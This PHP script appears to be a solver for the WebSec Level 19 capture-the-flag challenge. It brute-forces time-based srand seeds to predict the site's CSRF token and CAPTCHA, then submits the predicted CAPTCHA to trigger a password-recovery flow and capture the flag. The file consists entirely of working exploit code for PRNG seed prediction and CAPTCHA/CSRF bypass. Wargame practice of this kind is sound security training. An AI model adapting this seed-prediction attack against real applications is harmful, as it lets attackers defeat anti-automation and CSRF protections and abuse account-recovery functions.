<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║     WebSec Level 19 - Race Condition CAPTCHA Attack       ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

echo "[*] Strategy: Generate predictions for current time, then request page\n\n";

for ($attempt = 1; $attempt <= 50; $attempt++) {
    echo "[Attempt $attempt]\n";
    
    // Pre-generar predicciones para el tiempo actual
    $predictions = [];
    $current_microtime = microtime(true);
    
    // Generar predicciones para un pequeño rango alrededor del tiempo actual
    for ($offset_ms = -2000; $offset_ms <= 2000; $offset_ms += 10) {
        $seed = $current_microtime + ($offset_ms / 1000);
        srand($seed);
        $token = generate_random_text(32);
        $captcha = generate_random_text(25);
        
        $predictions[sprintf("%.6f", $seed)] = [
            'token' => $token,
            'captcha' => $captcha,
            'seed' => $seed
        ];
    }
    
    // INMEDIATAMENTE hacer la request
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Extraer session ID
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) {
        echo "  [-] Could not extract session ID\n";
        continue;
    }
    $session_id = $matches[1];
    
    // Extraer body y token
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) {
        echo "  [-] Could not extract CSRF token\n";
        continue;
    }
    $real_token = $token_match[1];
    
    echo "  [+] Session: $session_id\n";
    echo "  [+] Token: $real_token\n";
    
    // Buscar si tenemos una predicción que coincida
    foreach ($predictions as $seed_str => $pred) {
        if ($pred['token'] === $real_token) {
            echo "\n  [+] ✓✓✓ TOKEN MATCH FOUND! ✓✓✓\n";
            echo "  [+] Seed: $seed_str\n";
            echo "  [+] Predicted CAPTCHA: {$pred['captcha']}\n\n";
            
            // Enviar el CAPTCHA
            $post_data = http_build_query([
                'captcha' => $pred['captcha'],
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n╔════════════════════════════════════════════════════════════╗\n";
                echo "║                   🎉 SUCCESS! 🎉                         ║\n";
                echo "╠════════════════════════════════════════════════════════════╣\n";
                
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "║                                                            ║\n";
                    echo "║  FLAG: " . str_pad($flag_match[0], 49) . "║\n";
                    echo "║                                                            ║\n";
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                } else {
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                }
                exit(0);
            } else {
                echo "  [-] CAPTCHA submission failed\n";
                if (strpos($result, 'Invalid captcha') !== false) {
                    echo "  [-] Invalid captcha response\n";
                }
            }
            
            break;
        }
    }
    
    echo "  [-] No matching token in predictions\n\n";
    
    sleep(1);
}

echo "\n[-] Failed after 50 attempts\n";
?>